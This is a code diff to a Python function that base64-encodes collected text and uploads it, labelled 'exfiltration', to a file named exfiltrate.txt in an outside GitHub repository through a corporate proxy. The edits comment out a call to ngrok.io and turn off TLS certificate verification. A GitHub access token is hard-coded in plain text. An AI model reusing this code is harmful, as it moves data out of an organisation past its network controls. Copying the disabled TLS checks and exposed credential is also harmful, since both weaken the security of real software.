@@ -25,10 +25,10 @@ def RunCommand():
         'https': 'https://proxy.hub.gcp.groupement.systeme-u.fr:80',
     }
 
-    r = requests.get('http://ngrok.io', proxies=proxies)
-    print(r.status_code)
-    print(r.text)
-    text_to_send+=str(r.text)
+    # r = requests.get('http://ngrok.io', proxies=proxies)
+    # print(r.status_code)
+    # print(r.text)
+    # text_to_send+=str(r.text)
 
     url = "https://api.github.com/repos/androne23/this_is_fine_wuzzi/contents/exfiltrate.txt"
     headers = {
@@ -36,7 +36,7 @@ def RunCommand():
     'Authorization': 'Bearer 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',
     }
 
-    response = requests.request("GET", url, headers=headers, proxies=proxies)
+    response = requests.request("GET", url, headers=headers, proxies=proxies, verify=False)
 
     msg = "exfiltration"
     text_to_send=base64.b64encode(text_to_send.encode("utf-8")).decode("utf-8")
@@ -46,7 +46,7 @@ def RunCommand():
         "content": text_to_send,
         "sha": data['sha']
     }
-    r = requests.put(api, headers=headers, json=data, proxies=proxies)
+    r = requests.put(api, headers=headers, json=data, proxies=proxies, verify=False)
     print(r.text)
 
 
